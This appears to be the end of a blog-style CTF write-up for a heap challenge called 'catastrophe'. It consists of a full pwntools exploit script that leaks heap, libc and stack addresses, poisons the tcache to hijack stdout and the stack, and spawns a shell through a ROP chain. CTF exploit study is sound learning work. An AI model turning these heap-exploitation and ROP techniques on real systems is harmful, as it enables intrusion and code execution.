+<span style="color:#ff79c6">import</span> os
+<span style="color:#ff79c6">import</span> time
+<span style="color:#ff79c6">import</span> pwn
+
+
+<span style="color:#6272a4"># Set up pwntools for the correct architecture</span>
+exe <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>binary <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>ELF(<span style="color:#f1fa8c">&#39;catastrophe&#39;</span>)
+pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>delete_corefiles <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">True</span>
+pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>rename_corefiles <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">False</span>
+pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>timeout <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">2000</span>
+
+host <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>HOST <span style="color:#ff79c6">or</span> <span style="color:#f1fa8c">&#39;127.0.0.1&#39;</span>
+port <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>PORT <span style="color:#ff79c6">or</span> <span style="color:#bd93f9">1337</span>)
+
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">local</span>(argv<span style="color:#ff79c6">=</span>[], <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw):
+    <span style="color:#f1fa8c">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
+    <span style="color:#ff79c6">if</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>GDB:
+        <span style="color:#ff79c6">return</span> pwn<span style="color:#ff79c6">.</span>gdb<span style="color:#ff79c6">.</span>debug([exe<span style="color:#ff79c6">.</span>path] <span style="color:#ff79c6">+</span> argv, gdbscript<span style="color:#ff79c6">=</span>gdbscript, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)
+    <span style="color:#ff79c6">else</span>:
+        <span style="color:#ff79c6">return</span> pwn<span style="color:#ff79c6">.</span>process([exe<span style="color:#ff79c6">.</span>path] <span style="color:#ff79c6">+</span> argv, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)
+
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">remote</span>(argv<span style="color:#ff79c6">=</span>[], <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw):
+    <span style="color:#f1fa8c">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
+    io <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>connect(host, port)
+    <span style="color:#ff79c6">if</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>GDB:
+        pwn<span style="color:#ff79c6">.</span>gdb<span style="color:#ff79c6">.</span>attach(io, gdbscript<span style="color:#ff79c6">=</span>gdbscript)
+    <span style="color:#ff79c6">return</span> io
+
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">start</span>(argv<span style="color:#ff79c6">=</span>[], <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw):
+    <span style="color:#f1fa8c">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
+    <span style="color:#ff79c6">if</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>LOCAL:
+        <span style="color:#ff79c6">return</span> local(argv, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)
+    <span style="color:#ff79c6">else</span>:
+        <span style="color:#ff79c6">return</span> remote(argv, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)
+
+
+gdbscript <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;&#39;
+</span><span style="color:#f1fa8c">b* main
+</span><span style="color:#f1fa8c">source ~/Downloads/pwndbg/gdbinit.py
+</span><span style="color:#f1fa8c">continue
+</span><span style="color:#f1fa8c">&#39;&#39;&#39;</span><span style="color:#ff79c6">.</span>format(<span style="color:#ff79c6">**</span><span style="color:#8be9fd;font-style:italic">locals</span>())
+
+io <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">None</span>
+
+libc <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>ELF(<span style="color:#f1fa8c">&#34;libc.so.6&#34;</span>)
+
+io <span style="color:#ff79c6">=</span> start()
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">alloc</span>(idx, data, size, s<span style="color:#ff79c6">=</span><span style="color:#ff79c6">False</span>):
+   io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#34;-</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&gt; &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;1&#34;</span>) 
+   io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#34;Index?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&gt; &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(idx)<span style="color:#ff79c6">.</span>encode()) 
+   io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(size)<span style="color:#ff79c6">.</span>encode()) 
+   
+   <span style="color:#ff79c6">if</span> s:
+       io<span style="color:#ff79c6">.</span>sendafter(<span style="color:#f1fa8c">&#34;: &#34;</span>, data) 
+   <span style="color:#ff79c6">else</span>:
+       io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#34;: &#34;</span>, data) 
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">free</span>(idx):
+   io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;2&#34;</span>) 
+   io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(idx)<span style="color:#ff79c6">.</span>encode())
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">view</span>(idx):
+   io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;3&#34;</span>) 
+   io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(idx)<span style="color:#ff79c6">.</span>encode())
+
+<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">7</span>):
+    alloc(i, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>, <span style="color:#bd93f9">0x100</span>)
+free(<span style="color:#bd93f9">0</span>)
+
+view(<span style="color:#bd93f9">0</span>)
+
+heap <span style="color:#ff79c6">=</span> ((pwn<span style="color:#ff79c6">.</span>u64(io<span style="color:#ff79c6">.</span>recvline()[:<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)) <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">12</span>))
+pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;heap @ </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(heap)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+<span style="color:#6272a4"># then we defeated safe linking lol</span>
+
+alloc(<span style="color:#bd93f9">0</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;YY&#34;</span>, <span style="color:#bd93f9">0x100</span>)
+
+alloc(<span style="color:#bd93f9">7</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;YY&#34;</span>, <span style="color:#bd93f9">0x100</span>)
+alloc(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;YY&#34;</span>, <span style="color:#bd93f9">0x100</span>)
+
+alloc(<span style="color:#bd93f9">9</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;/bin/sh</span><span style="color:#f1fa8c">\0</span><span style="color:#f1fa8c">&#34;</span>, <span style="color:#bd93f9">0x10</span>)
+
+<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">7</span>):
+    free(i)
+
+alloc(<span style="color:#bd93f9">9</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;YY&#34;</span>, <span style="color:#bd93f9">100</span>)
+free(<span style="color:#bd93f9">9</span>)
+
+free(<span style="color:#bd93f9">8</span>)
+free(<span style="color:#bd93f9">7</span>)
+view(<span style="color:#bd93f9">8</span>)
+
+libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>u64(io<span style="color:#ff79c6">.</span>recvline()[:<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x219ce0</span> <span style="color:#6272a4"># - 0x1bebe0 # offset of the unsorted bin</span>
+
+rop <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>ROP(libc)
+binsh <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">next</span>(libc<span style="color:#ff79c6">.</span>search(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;/bin/sh</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>))
+rop<span style="color:#ff79c6">.</span>execve(binsh, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>)
+
+environ <span style="color:#ff79c6">=</span> libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x221200</span> 
+stdout <span style="color:#ff79c6">=</span> libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x21a780</span>
+
+pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;libc: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(libc<span style="color:#ff79c6">.</span>address)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;environ: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(environ)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;stdout: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(stdout)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+
+alloc(<span style="color:#bd93f9">0</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;YY&#34;</span>, <span style="color:#bd93f9">0x100</span>)
+free(<span style="color:#bd93f9">8</span>)
+alloc(<span style="color:#bd93f9">1</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;T&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x108</span> <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x111</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64((stdout <span style="color:#ff79c6">^</span> ((heap <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0xb20</span>) <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#bd93f9">12</span>))), <span style="color:#bd93f9">0x130</span>)
+alloc(<span style="color:#bd93f9">2</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;TT&#34;</span>, <span style="color:#bd93f9">0x100</span>)
+alloc(<span style="color:#bd93f9">3</span>, pwn<span style="color:#ff79c6">.</span>p32(<span style="color:#bd93f9">0xfbad1800</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p32(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(environ)<span style="color:#ff79c6">*</span><span style="color:#bd93f9">3</span> <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(environ) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(environ <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x8</span>)<span style="color:#ff79c6">*</span><span style="color:#bd93f9">2</span> <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(environ <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">8</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(environ <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">8</span>), <span style="color:#bd93f9">0x100</span>)
+
+stack <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>u64(io<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">8</span>)[:<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x130</span> <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">8</span><span style="color:#6272a4"># - 0x1bebe0 # offset of the unsorted bin</span>
+pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;stack: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(stack)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+
+free(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4"># large</span>
+free(<span style="color:#bd93f9">2</span>)
+
+alloc(<span style="color:#bd93f9">5</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;T&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x108</span> <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x111</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64((stack <span style="color:#ff79c6">^</span> ((heap <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0xb20</span>) <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#bd93f9">12</span>))), <span style="color:#bd93f9">0x130</span>)
+alloc(<span style="color:#bd93f9">2</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;TT&#34;</span>, <span style="color:#bd93f9">0x100</span>)
+
+alloc(<span style="color:#bd93f9">3</span>, pwn<span style="color:#ff79c6">.</span>p64(stack) <span style="color:#ff79c6">+</span> rop<span style="color:#ff79c6">.</span>chain(), <span style="color:#bd93f9">0x100</span>) <span style="color:#6272a4"># overwrite sRBP for nothing lmao</span>
+
+io<span style="color:#ff79c6">.</span>interactive()
+</code></pre></div>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
